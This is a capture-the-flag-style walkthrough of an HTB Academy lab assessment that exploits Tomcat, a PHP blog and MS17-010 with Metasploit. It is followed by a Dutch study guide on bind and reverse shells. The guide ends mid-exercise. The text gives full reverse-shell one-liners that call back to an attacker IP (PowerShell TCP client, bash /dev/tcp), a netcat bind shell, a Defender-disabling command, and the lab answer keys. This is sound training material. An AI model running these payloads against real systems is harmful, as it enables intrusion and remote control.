


# HTB Academy - Shells & Payloads: Skills Assessment

## Complete Technical Documentation & Troubleshooting Guide

---

## 📋 Table of Contents

1. [Executive Summary](#executive-summary)
2. [Lab Environment Setup](#lab-environment-setup)
3. [Network Topology & Initial Access](#network-topology)
4. [Host-1: Windows Server (Tomcat)](#host-1-tomcat)
5. [Host-2: Linux (Gabber Blog)](#host-2-gabber)
6. [Host-3: Windows Server (EternalBlue)](#host-3-eternalblue)
7. [Common Issues & Solutions](#troubleshooting)
8. [Command Reference Cheat Sheet](#command-reference)
9. [MITRE ATT&CK Mapping](#mitre-attack)
10. [Lessons Learned](#lessons-learned)

---

## 📊 Executive Summary

**Assessment Type:** Penetration Testing Skills Assessment  
**Module:** HTB Academy - Shells & Payloads  
**Duration:** ~2-4 hours  
**Difficulty:** Intermediate  
**Successful Flags:** 7/7

### Objectives Achieved

✅ Exploit Windows host and receive interactive shell  
✅ Exploit Linux host and receive interactive shell  
✅ Exploit Web application and receive interactive shell  
✅ Identify shell environment and user context

### Exploitation Techniques Used

1. **Tomcat Manager WAR File Upload** (Host-1)
2. **Gabber/Lightweight Blog RCE via File Upload** (Host-2)
3. **MS17-010 EternalBlue/PSExec** (Host-3)

---

## 🔧 Lab Environment Setup

### Initial Connection

bash

```bash
# Connect to foothold via RDP
xfreerdp /v:<TARGET_IP> /u:htb-student /p:HTB_@cademy_stdnt!

# Example with actual IP
xfreerdp /v:10.129.2.141 /u:htb-student /p:HTB_@cademy_stdnt!
```

### Important Notes

- **New spawn = Fresh environment**: Payloads and exploits must be recreated
- **Wait time**: Allow 1-2 minutes after spawning for all services to start
- **Connection issues**: If RDP fails, respawn the target

---

## 🗺️ Network Topology

```
┌─────────────────────────────────────────────────────────┐
│  Internet / HTB VPN                                      │
│  10.129.x.x (Your Machine)                              │
└────────────────┬────────────────────────────────────────┘
                 │
                 │ RDP (3389)
                 │
    ┌────────────▼─────────────────────────────┐
    │  FOOTHOLD: 10.129.204.126                │
    │  (Parrot Linux via RDP)                   │
    │  Internal IP: 172.16.1.5                 │
    └────────────┬─────────────────────────────┘
                 │
                 │ Internal Network: 172.16.0.0/23
                 │
    ┌────────────▼─────────────────────────────┐
    │                                           │
    │  ┌─────────────┐  ┌──────────────┐      │
    │  │   Host-1    │  │   Host-2     │      │
    │  │ 172.16.1.11 │  │ 172.16.1.12  │      │
    │  │ Windows 2019│  │ Ubuntu Linux │      │
    │  │ Tomcat 10   │  │ Gabber Blog  │      │
    │  │ Port: 8080  │  │ Port: 80     │      │
    │  └─────────────┘  └──────────────┘      │
    │                                           │
    │  ┌─────────────┐                         │
    │  │   Host-3    │                         │
    │  │ 172.16.1.13 │                         │
    │  │ Windows 2016│                         │
    │  │ SMB: 445    │                         │
    │  └─────────────┘                         │
    └───────────────────────────────────────────┘
```

### Critical IP Information

|Component|External IP|Internal IP|Notes|
|---|---|---|---|
|Foothold|10.129.x.x (varies)|172.16.1.5|Use internal IP for LHOST!|
|Host-1|N/A|172.16.1.11|status.inlanefreight.local|
|Host-2|N/A|172.16.1.12|blog.inlanefreight.local|
|Host-3|N/A|172.16.1.13|No hostname resolution needed|

### Credentials Reference

|Service|Username|Password|Notes|
|---|---|---|---|
|Foothold RDP|htb-student|HTB_@cademy_stdnt!|Parrot Linux|
|Tomcat Manager|tomcat|Tomcatadm|Host-1|
|Gabber Blog|admin|admin123!@#|Host-2|
|MySQL (Host-2)|root|HTB_@cademy_r00t!|Not needed for exploit|

---

## 🎯 Host-1: Windows Server (Tomcat)

### Target: 172.16.1.11 | Hostname: shells-winsvr

### 1.1 Initial Reconnaissance

bash

```bash
# Network discovery
nmap -sn 172.16.1.0/24

# Full port scan (takes ~5 minutes)
nmap -sV -sC -p- 172.16.1.11

# Quick scan (recommended)
nmap -sV -sC --top-ports 1000 172.16.1.11

# Hostname discovery
nmap -sV --script nbstat 172.16.1.11
```

**Key Findings:**

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
8080/tcp open  http          Apache Tomcat 10.0.11
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard

Host script results:
| nbstat: NetBIOS name: SHELLS-WINSVR
|   SHELLS-WINSVR<00>    Flags: <unique><active>
```

✅ **Answer Q1:** `shells-winsvr`

### 1.2 Vulnerability Analysis

**Apache Tomcat 10.0.11 Analysis:**

- Tomcat Manager interface accessible on port 8080
- Default credentials often work: `tomcat:tomcat` or `admin:admin`
- WAR file upload functionality = RCE vector

**Why Tomcat Manager?**

- Direct code execution via JSP (Java Server Pages)
- No CVE exploitation required
- Reliable and well-documented attack vector

### 1.3 Exploit Development

#### Step 1: Create Malicious WAR Payload

bash

```bash
# Generate reverse shell WAR file
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=172.16.1.5 \
  LPORT=4444 \
  -f war \
  -o shell.war

# Verify file creation
ls -lh shell.war
```

**Parameter Breakdown:**

- `-p java/jsp_shell_reverse_tcp`: Java-based reverse shell payload
- `LHOST=172.16.1.5`: **CRITICAL - Use internal foothold IP, NOT VPN IP**
- `LPORT=4444`: Callback port (use >1024 to avoid needing sudo)
- `-f war`: Output format (Web Application Archive)
- `-o shell.war`: Output filename

**Common Mistakes:** ❌ Using VPN IP (10.129.x.x) for LHOST → Shell won't connect  
❌ Using port <1024 without sudo → Permission denied  
✅ Using internal IP (172.16.1.5) → Success

#### Step 2: Setup Listener

bash

```bash
# Option 1: Netcat (simple)
nc -lvnp 4444

# Option 2: Metasploit multi/handler (more features)
msfconsole -q
use multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST 172.16.1.5
set LPORT 4444
run -j  # Run as job (background)
```

### 1.4 Payload Delivery

#### Method 1: Browser Upload (RECOMMENDED)

bash

```bash
# Open Firefox in foothold
firefox http://172.16.1.11:8080/manager/html &
```

**Steps:**

1. Login with `tomcat` / `Tomcatadm`
2. Scroll to "WAR file to deploy" section
3. Click "Choose File" and select `shell.war`
4. Click "Deploy"
5. Wait for deployment confirmation
6. Click on `/shell` in the Applications list to trigger

#### Method 2: Command Line (Often Fails - 403 Error)

bash

```bash
# This usually DOESN'T work due to role restrictions
curl -u 'tomcat:Tomcatadm' \
  --upload-file shell.war \
  "http://172.16.1.11:8080/manager/text/deploy?path=/shell"
```

**Why it fails:**

- User `tomcat` has `manager-gui` role
- CLI upload requires `manager-script` role
- **Solution:** Use browser upload instead

#### Method 3: Metasploit Module

bash

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.16.1.11
set RPORT 8080
set HttpUsername tomcat
set HttpPassword Tomcatadm
set LHOST 172.16.1.5
set LPORT 4444
exploit
```

**Common Issues:**

- Module says "Exploit completed, but no session was created"
- **Solution:** Try manual browser upload instead

### 1.5 Post-Exploitation

Once shell is received:

cmd

```cmd
# Verify connection
whoami
hostname

# Navigate to target directory
cd C:\Shares\
dir

# Expected output:
# Directory of C:\Shares
# 09/22/2021  12:24 PM    <DIR>          dev-share
```

✅ **Answer Q2:** `dev-share`

### 1.6 Alternative Attack Vectors (Not Used)

**Status Page Upload ([http://172.16.1.11/](http://172.16.1.11/)):**

- Also has file upload functionality
- May require different credentials or be less restricted
- Consider if Tomcat Manager fails

**IIS (Port 80):**

- Microsoft IIS 10.0 running
- Could upload ASPX webshell if accessible
- Not needed for this assessment

---

## 🐧 Host-2: Linux (Gabber Blog)

### Target: 172.16.1.12 | Hostname: blog.inlanefreight.local

### 2.1 Initial Reconnaissance

bash

```bash
# Quick scan
nmap -sV -sC --top-ports 1000 172.16.1.12

# Full scan (if needed)
nmap -sV -sC -p- 172.16.1.12
```

**Key Findings:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/
```

✅ **Answer Q3:** `ubuntu`

### 2.2 Web Application Analysis

#### DNS Configuration (CRITICAL)

bash

```bash
# Check /etc/hosts
cat /etc/hosts

# If blog.inlanefreight.local is NOT present, add it:
echo "172.16.1.12    blog.inlanefreight.local" | sudo tee -a /etc/hosts

# Verify
ping -c 2 blog.inlanefreight.local
```

**Without this step:**

- 404 Not Found errors
- Cannot access the blog
- Exploit will fail

#### Initial Web Enumeration

bash

```bash
# View the homepage
curl http://blog.inlanefreight.local

# Check robots.txt
curl http://blog.inlanefreight.local/robots.txt

# Directory enumeration
gobuster dir -u http://blog.inlanefreight.local \
  -w /usr/share/wordlists/dirb/common.txt
```

**Application Identified:**

- **Name:** Gabber (Lightweight Facebook-styled Blog)
- **Version:** 1.3
- **Creator:** Miroslav Šedivý (2016-2020)
- **Technology:** PHP-based
- **Key Feature:** Photo upload functionality

### 2.3 Credential Discovery

#### Configuration File Enumeration

bash

```bash
# Common config file locations to check
curl http://blog.inlanefreight.local/data/config.ini
curl http://blog.inlanefreight.local/config.php
curl http://blog.inlanefreight.local/data/
```

**Gold Mine - config.ini:**

ini

```ini
[admin]
force_login = true
nick = admin
pass = 'admin123!@#'

[database]
db_connection = mysql
mysql_user = root
mysql_pass = "HTB_@cademy_r00t!"
```

**Credentials Found:**

- Blog Admin: `admin:admin123!@#`
- MySQL: `root:HTB_@cademy_r00t!`

### 2.4 Exploit Research

bash

```bash
# Search for Gabber exploits
searchsploit gabber

# Search for the specific exploit mentioned in hints
searchsploit 50064

# Download the exploit
searchsploit -m 50064
```

**Exploit Found:**

```
Exploit: Lightweight facebook-styled blog 1.3 - Remote Code Execution (Authenticated)
Path: /usr/share/exploitdb/exploits/php/webapps/50064.rb
Type: Metasploit module
```

✅ **Answer Q4:** `php` (The uploaded shell is written in PHP)

### 2.5 Exploit Setup

#### Prepare Metasploit Module

bash

```bash
# Option 1: Copy to user Metasploit directory
mkdir -p ~/.msf4/modules/exploits/multi/http/
cp 50064.rb ~/.msf4/modules/exploits/multi/http/

# Option 2: Use loadpath (easier for one-time use)
# Just note the path: /home/htb-student/50064.rb
```

#### Launch Metasploit

bash

```bash
msfconsole -q

# If using Option 1:
reload_all
search 50064

# If using Option 2:
loadpath /home/htb-student/
search 50064
```

### 2.6 Exploitation

ruby

```ruby
# Use the exploit
use exploit/multi/http/50064
# Or if numbered: use 0

# Configure options
set RHOSTS blog.inlanefreight.local
set RHOST blog.inlanefreight.local  # Some versions need both
set USERNAME admin
set PASSWORD admin123!@#
set VHOST blog.inlanefreight.local  # CRITICAL!
set TARGETURI /
set LHOST 172.16.1.5
set LPORT 4445

# Verify settings
show options

# Execute
exploit
```

**Critical Configuration Notes:**

|Option|Value|Why Critical|
|---|---|---|
|VHOST|blog.inlanefreight.local|Without this: `NoMethodError undefined method 'split' for nil:NilClass`|
|LHOST|172.16.1.5|Must be internal IP, not VPN IP|
|USERNAME|admin|From config.ini|
|PASSWORD|admin123!@#|From config.ini, NOT demo:demo|

**Expected Output:**

```
[*] Started reverse TCP handler on 172.16.1.5:4445
[*] Retrieving CSRF token...
[*] Got CSRF token: 5f828d0a9b
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/xyz123.php
[*] Command shell session 1 opened
```

### 2.7 Post-Exploitation

bash

```bash
# Upgrade to interactive shell (if needed)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Or just use the shell directly
whoami
# Output: www-data

# Navigate to flag location
cd /customscripts
ls -la
cat flag.txt
```

✅ **Answer Q5:** `B1nD_Shells_r_cool` (or similar - flag changes per spawn)

### 2.8 Understanding the Exploit

**How 50064.rb Works:**

1. Authenticates using provided credentials
2. Obtains CSRF token from the application
3. Uploads a PHP webshell disguised as an image
4. Stores it in `data/i/` directory
5. Accesses the PHP file to execute commands

**File Upload Bypass:**

- Application allows image uploads
- PHP code embedded in "image" file
- Server executes PHP despite image extension
- Common web application vulnerability

---

## 💻 Host-3: Windows Server (EternalBlue)

### Target: 172.16.1.13 | Hostname: shells-winblue

### 3.1 Initial Reconnaissance

bash

```bash
# Quick scan
nmap -sV -sC --top-ports 1000 172.16.1.13

# SMB-specific enumeration
nmap -p445 --script smb-protocols,smb-security-mode,smb-os-discovery 172.16.1.13
```

**Key Findings:**

```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
```

✅ **Answer Q6:** `shells-winblue`

### 3.2 Vulnerability Assessment

#### MS17-010 (EternalBlue) Check

bash

```bash
# Using Nmap NSE script
nmap -p445 --script smb-vuln-ms17-010 172.16.1.13

# Using Metasploit auxiliary module
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.16.1.13
run
```

**Expected Output:**

```
[+] 172.16.1.13:445 - Host is likely VULNERABLE to MS17-010!
    - Windows Server 2016 Standard 14393 x64 (64-bit)
```

**Vulnerability Details:**

- **CVE:** CVE-2017-0144 (MS17-010)
- **Name:** EternalBlue
- **Severity:** Critical (CVSS 9.8)
- **Impact:** Remote Code Execution as SYSTEM
- **Exploited by:** WannaCry, NotPetya ransomware

### 3.3 Exploitation Strategy

#### Why NOT ms17_010_eternalblue?

The standard EternalBlue module often fails:

```
[*] Sending all but last fragment of exploit packet
[*] Starting non-paged pool grooming
[+] Sending SMBv2 buffers
[*] Sending last fragment of exploit packet!
[+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[-] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

**Reasons for failure:**

- Memory race condition
- Unstable on patched/semi-patched systems
- Groom allocation timing issues

#### Solution: Use ms17_010_psexec

bash

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.13
set LHOST 172.16.1.5
set LPORT 4446
show options
exploit
```

**Why PSExec variant works better:**

1. Uses the MS17-010 vulnerability to write files
2. Uploads a small service executable
3. Starts the service remotely
4. More stable than memory-only exploitation
5. Less prone to crashes

### 3.4 Successful Exploitation

**Expected Output:**

```
[*] Started reverse TCP handler on 172.16.1.5:4446
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Filling barrel with fish... done
[+] 172.16.1.13:445 - Successfully negotiated SMBv1 connection!
[*] 172.16.1.13:445 - Sending exploit packet!
[+] 172.16.1.13:445 - Connection established for exploitation.
[*] 172.16.1.13:445 - Executing the payload...
[+] 172.16.1.13:445 - Service start timed out, OK if running...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:4446 -> 172.16.1.13:49671)
```

### 3.5 Post-Exploitation

bash

```bash
# Meterpreter commands
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : SHELLS-WINBLUE
OS              : Windows 2016+ (10.0 Build 14393)

# Get shell
meterpreter > shell
Process 2484 created.
Channel 1 created.

# Navigate to flag
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type Skills-flag.txt
```

✅ **Answer Q7:** `One-H0st-Down!` (or similar - flag changes per spawn)

---

## 🔍 Common Issues & Solutions

### Issue Matrix

|Problem|Symptoms|Root Cause|Solution|
|---|---|---|---|
|**No shell received**|Listener shows no connection|Wrong LHOST (VPN IP instead of internal)|Use `172.16.1.5` for LHOST|
|**Tomcat 403 Forbidden**|CLI upload fails|User lacks manager-script role|Use browser upload instead|
|**Gabber 404 Error**|Cannot access blog|No /etc/hosts entry|Add `172.16.1.12 blog.inlanefreight.local`|
|**VHOST error in MSF**|`NoMethodError undefined method 'split'`|VHOST not set|`set VHOST blog.inlanefreight.local`|
|**EternalBlue hangs**|Exploit stalls at "Sending fragments"|Memory race condition|Use `ms17_010_psexec` instead|
|**Handler bind error**|Permission denied on port <1024|Non-root trying privileged port|Use port >1024 or `sudo msfconsole`|
|**Module not found**|Exploit doesn't load|Fresh spawn/not copied|Re-download with `searchsploit -m 50064`|
|**Browser timeout**|Firefox won't load page|Service not fully started|Wait 1-2 min after spawn|

---

## 📝 Command Reference Cheat Sheet

### Initial Setup (Per New Spawn)

bash

```bash
# 1. Connect to foothold
xfreerdp /v:<FOOTHOLD_IP> /u:htb-student /p:HTB_@cademy_stdnt!

# 2. Discover internal network
nmap -sn 172.16.1.0/24

# 3. Download exploit
searchsploit -m 50064

# 4. Create payloads
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war

# 5. Configure DNS
echo "172.16.1.12 blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

### Host-1 Quick Attack

bash

```bash
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war

# Start listener
nc -lvnp 4444 &

# Upload via browser
firefox http://172.16.1.11:8080/manager/html &
# Login: tomcat / Tomcatadm
# Upload shell.war
# Click /shell

# In shell:
dir C:\Shares\
```

### Host-2 Quick Attack

bash

```bash
# Get credentials
curl http://blog.inlanefreight.local/data/config.ini | grep -A2 admin

# Metasploit
msfconsole -q
loadpath /home/htb-student/
search 50064
use 0
set RHOSTS blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123!@#
set VHOST blog.inlanefreight.local
set LHOST 172.16.1.5
set LPORT 4445
exploit

# In shell:
cat /customscripts/flag.txt
```

### Host-3 Quick Attack

bash

```bash
# Verify vulnerability
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.16.1.13
run

# Exploit
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.13
set LHOST 172.16.1.5
set LPORT 4446
exploit

# In meterpreter:
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

---

## ✅ Quick Reference: All Answers

|Question|Answer|Host|Method|
|---|---|---|---|
|Q1: Hostname of Host-1?|`shells-winsvr`|172.16.1.11|`nmap --script nbstat`|
|Q2: Folder in C:\Shares?|`dev-share`|172.16.1.11|Tomcat WAR upload → shell|
|Q3: Linux distribution Host-2?|`ubuntu`|172.16.1.12|`nmap -O` or SSH banner|
|Q4: Shell language in 50064.rb?|`php`|N/A|Read exploit code|
|Q5: Contents of /customscripts/flag.txt?|(varies per spawn)|172.16.1.12|Gabber exploit → shell|
|Q6: Hostname of Host-3?|`shells-winblue`|172.16.1.13|`nmap --script nbstat`|
|Q7: Contents of Skills-flag.txt?|(varies per spawn)|172.16.1.13|MS17-010 → shell|

---

**Document Version:** 2.0  
**Last Updated:** January 29, 2026  
**Status:** Complete
# HTB Academy - Shells & Payloads Module

## Nederlandse Studiegids met Complete Uitleg

---

## 📚 Inhoudsopgave

1. [Introductie: Shells & Payloads](#introductie)
2. [Anatomie van een Shell](#anatomie)
3. [Bind Shells](#bind-shells)
4. [Reverse Shells](#reverse-shells)
5. [Payloads Maken](#payloads)
6. [Windows Shells](#windows)
7. [Linux/Unix Shells](#linux)
8. [Web Shells](#webshells)
9. [Detectie & Preventie](#detectie)
10. [Skills Assessment](#assessment)

---

## 🎯 Introductie: Shells & Payloads {#introductie}

### Wat is een Shell?

Een **shell** is een programma dat een interface biedt om instructies in het systeem in te voeren en tekstuitvoer te bekijken (zoals Bash, Zsh, cmd en PowerShell).

Voor penetratietesters is een shell vaak het **resultaat van het exploiteren van een kwetsbaarheid** om interactieve toegang tot een host te verkrijgen.

### Veelgebruikte Uitdrukkingen

```
"Ik heb een shell gevangen."  (I caught a shell)
"Ik heb een shell gepopt!"    (I popped a shell)
"Ik ben in een shell gedropt!"
"Ik ben binnen!"              (I'm in!)
```

**Betekenis:** De persoon heeft succesvol een kwetsbaarheid geëxploiteerd en heeft remote controle over de shell van het doelsysteem.

### Waarom een Shell Verkrijgen?

De shell geeft **directe toegang** tot:

- ✅ Het besturingssysteem (OS)
- ✅ Systeemcommando's
- ✅ Het bestandssysteem

**Voordelen van Shell-toegang:**

|Voordeel|Beschrijving|
|---|---|
|**Enumeratie**|Systeem onderzoeken op escalatievectoren|
|**Pivoting**|Doordringen naar andere systemen|
|**File Transfer**|Bestanden overbrengen|
|**Persistence**|Toegang behouden voor langere tijd|
|**Stealth**|CLI is moeilijker te detecteren dan GUI (VNC/RDP)|
|**Automatisering**|Acties makkelijker te scripten|

### Shell Perspectieven

|Perspectief|Beschrijving|
|---|---|
|**Computing**|Tekstgebaseerde userland omgeving (Bash, Zsh, cmd, PowerShell)|
|**Exploitation**|Resultaat van kwetsbaarheid exploitatie (bijv. EternalBlue → cmd-prompt)|
|**Web**|Exploiteert upload-kwetsbaarheid voor instructies via browser|

### Wat zijn Payloads?

Een **payload** is code die ontwikkeld is om een kwetsbaarheid te exploiteren.

**Payload Definities per Context:**

```
┌─────────────────────────────────────────────────────┐
│ Networking    → Ingekapselde data in een pakket     │
│ Computing     → Actie-gedeelte van instructie        │
│ Programming   → Data in een instructie               │
│ Security      → Malicious code voor exploitatie      │
└─────────────────────────────────────────────────────┘
```

---

## 🔧 Anatomie van een Shell {#anatomie}

### Terminal Emulators Overzicht

|Terminal Emulator|Besturingssysteem|
|---|---|
|Windows Terminal|Windows|
|cmder|Windows|
|PuTTY|Windows|
|kitty|Windows, Linux, MacOS|
|Alacritty|Windows, Linux, MacOS|
|xterm|Linux|
|GNOME Terminal|Linux|
|MATE Terminal|Linux|
|Konsole|Linux|
|Terminal|MacOS|
|iTerm2|MacOS|

### Command Language Interpreters

Een **command language interpreter** werkt zoals een menselijke tolk:

- Interpreteert gebruikersinstructies
- Geeft taken door aan het OS

**Command-Line Interface = Combinatie van:**

1. Besturingssysteem (OS)
2. Terminal Emulator (applicatie)
3. Command Language Interpreter (taalverwerker)

### Praktische Identificatie

#### Shell Herkennen via Prompt

bash

```bash
# Bash prompt
$ whoami
htb-student

# PowerShell prompt
PS C:\> $PSVersionTable
```

**Herkenning aan `$` teken:**

- Gebruikt in Bash, Ksh, POSIX
- Markeert start van de shell prompt

#### Shell Validatie via Processen

bash

```bash
# Linux - bekijk draaiende processen
ps
  PID TTY          TIME CMD
 4232 pts/1    00:00:00 bash
11435 pts/1    00:00:00 ps
```

#### Shell Validatie via Omgevingsvariabelen

bash

````bash
# Bekijk shell-variabele
env | grep SHELL
SHELL=/bin/bash
```

### PowerShell vs Bash Vergelijking

| Kenmerk | Bash | PowerShell |
|---------|------|------------|
| **Icoon in Pwnbox** | Groen vierkant | Blauw vierkant |
| **OS Native** | Linux/Unix | Windows (ook op Linux via Core) |
| **Prompt** | `$` | `PS >` |
| **Versie Check** | `bash --version` | `$PSVersionTable` |

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Welke twee shell-talen hebben we gebruikt?
```
Antwoord: bash&powershell
````

**Vraag 2:** Welke editie van PowerShell draait op Pwnbox?

bash

````bash
# Commando in PowerShell:
$PSVersionTable

# Kijk naar de regel:
PSEdition: Core

Antwoord: Core
```

---

## 🔗 Bind Shells {#bind-shells}

### Wat is een Bind Shell?

Bij een **bind shell** heeft het doelsysteem een listener gestart en wacht op een verbinding van de pentester.
```
┌──────────────┐                    ┌──────────────┐
│ Attack Box   │ ──── connect ───>  │   Target     │
│  (Client)    │                    │  (Server)    │
└──────────────┘                    └──────────────┘
                                    Listening on port
````

### Uitdagingen bij Bind Shells

❌ **Problemen:**

- Listener moet al actief zijn op target
- Firewall blokkeert inkomende verbindingen
- NAT/PAT op netwerkrand
- OS firewalls (Windows/Linux) blokkeren meeste inkomende traffic

### Netcat: Het Zwitserse Zakmes

**Netcat (nc) kan:**

- ✅ TCP, UDP en Unix sockets
- ✅ IPv4 & IPv6
- ✅ Sockets openen en luisteren
- ✅ Als proxy fungeren
- ✅ Tekst input/output verwerken

### Praktische Oefening: Basis Netcat Verbinding

#### Stap 1: Server - Start Listener op Target

bash

```bash
# Op de target machine
nc -lvnp 7777

# Output:
Listening on [0.0.0.0] (family 0, port 7777)
```

**Parameter Uitleg:**

- `-l` = listen (luister mode)
- `-v` = verbose (geef details)
- `-n` = no DNS lookup (gebruik geen DNS)
- `-p` = port (specificeer poort)

#### Stap 2: Client - Verbind vanaf Attack Box

bash

```bash
# Op de attack box
nc -nv 10.129.41.200 7777

# Output:
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

#### Stap 3: Test de Verbinding

bash

```bash
# Client stuurt bericht:
Hello Academy

# Server ontvangt:
Connection from 10.10.14.117 51914 received!
Hello Academy
```

**⚠️ Let op:** Dit is nog **geen echte shell**, alleen een TCP-sessie!

### Echte Bind Shell Opzetten

#### Server-Side Payload

bash

```bash
# Op target - bind Bash aan TCP sessie
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Payload Breakdown:**

|Commando|Functie|
|---|---|
|`rm -f /tmp/f`|Verwijder oude pipe|
|`mkfifo /tmp/f`|Maak named pipe aan|
|`cat /tmp/f \|`|Lees van pipe|
|`/bin/bash -i`|Start interactieve Bash|
|`2>&1`|Stuur errors ook door pipe|
|`nc -l ... > /tmp/f`|Netcat luistert en schrijft naar pipe|

#### Client-Side Verbinding

bash

````bash
# Verbind en krijg shell
nc -nv 10.129.41.200 7777

# Nu krijg je een echte shell:
Target@server:~$
```

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Des gebruikt `nc -lvnp 443`. Welke poort voor verbinding?
```
Antwoord: 443
Uitleg: De -p vlag geeft de luisterpoort aan
````

**Vraag 2:** Maak bind shell en haal flag uit /customscripts

bash

````bash
# 1. SSH naar target
ssh htb-student@<TARGET_IP>
# Wachtwoord: HTB_@cademy_stdnt!

# 2. Start bind shell op target
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f

# 3. In nieuwe terminal op Pwnbox - verbind
nc -nv <TARGET_IP> 7777

# 4. Zodra binnen, haal flag
cat /customscripts/flag.txt

Antwoord: [De flag die je ziet]
```

---

## ⬅️ Reverse Shells {#reverse-shells}

### Wat is een Reverse Shell?

Bij een **reverse shell** draait de listener op de **attack box** en moet het target de verbinding initiëren.
```
┌──────────────┐                    ┌──────────────┐
│ Attack Box   │ <── connect ────   │   Target     │
│  (Server)    │                    │  (Client)    │
│ Listening    │                    │ Calls back   │
└──────────────┘                    └──────────────┘
````

### Waarom Reverse Shell?

**Firewalls blokkeren:**

- ❌ Inkomend verkeer (streng)
- ✅ Uitgaand verkeer (vaak toegestaan)

**Voordelen:**

- ✅ Omzeilt firewall restrictions
- ✅ Werkt achter NAT
- ✅ Moeilijker te detecteren
- ✅ **Meest gebruikte methode in de praktijk**

### Vergelijkingstabel

|Kenmerk|Bind Shell|Reverse Shell|
|---|---|---|
|**Wie luistert?**|Target|Attack Box|
|**Wie verbindt?**|Attack Box|Target|
|**Firewall**|Vaak geblokkeerd|Werkt meestal wel|
|**Gebruik**|Intern netwerk|Bijna alle scenario's|

### Praktische Oefening: Windows Reverse Shell

#### Stap 1: Start Listener (Attack Box)

bash

```bash
# Op jouw Kali/Pwnbox
sudo nc -lvnp 443

# Wacht op verbinding...
listening on [any] 443 ...
```

#### Stap 2: Windows Defender Uitschakelen

powershell

```powershell
# In PowerShell als Administrator op target
Set-MpPreference -DisableRealtimeMonitoring $true
```

**⚠️ Let op:** Dit is alleen voor educatieve doeleinden in het lab!

#### Stap 3: Reverse Shell Payload (Windows)

powershell

```powershell
# Vervang 10.10.14.158 met JOUW IP (ip a show tun0)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Stap 4: Shell Ontvangen

bash

```bash
# Op jouw listener zie je:
connect to [10.10.14.158] from (UNKNOWN) [10.129.x.x] 49674
PS C:\Users\Administrator>
```

### Linux Reverse Shell One-Liner

bash

````bash
# Bash one-liner
bash -i >& /dev/tcp/10.10.14.158/443 0>&1
```

**Breakdown:**
- `bash -i` = Interactieve shell
- `>&` = Redirect stdout en stderr
- `/dev/tcp/IP/PORT` = Netwerkverbinding
- `0>&1` = Stdin ook via verbinding

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Target als client of server bij reverse shell?
```
Antwoord: client
Uitleg: Target maakt de verbinding (zoals browser naar website)
````

**Vraag 2:** RDP verbinden, reverse shell starten, hostname ophalen

bash

```bash
# 1. Vind jouw IP
ip a show tun0
# Let op inet adres

# 2. Start listener op Kali
sudo nc -lvnp 443

# 3. RDP naar Windows
xfreerdp /v:<TARGET_IP> /u:Administrator /p:<PASSWORD>

# 4. In Windows PowerShell (als Admin):
Set-MpPreference -DisableRealtimeMonitoring $true

